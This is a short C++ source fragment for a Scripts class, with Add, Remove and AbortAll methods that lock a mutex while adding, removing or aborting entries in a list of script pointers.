VOID Scripts::Add(Script* Script){
	Mutex.WaitForAccess();
	ScriptList.push_back(Script);
	Mutex.Release();
}

VOID Scripts::Remove(Script* Script){
	Mutex.WaitForAccess();
	for(UINT i = 0; i < ScriptList.size(); i++){
		if(ScriptList[i] == Script){
			ScriptList.erase(ScriptList.begin() + i);
			break;
		}
	}
	Mutex.Release();
}

VOID Scripts::AbortAll(Script* Script){
	Mutex.WaitForAccess();
	for(UINT i = 0; i < ScriptList.size(); i++){
		if(ScriptList[i] != Script){
			ScriptList[i]->Abort();
			ScriptList.erase(ScriptList.begin() + i);
			i--;
		}
	}
	Mutex.Release();
}

}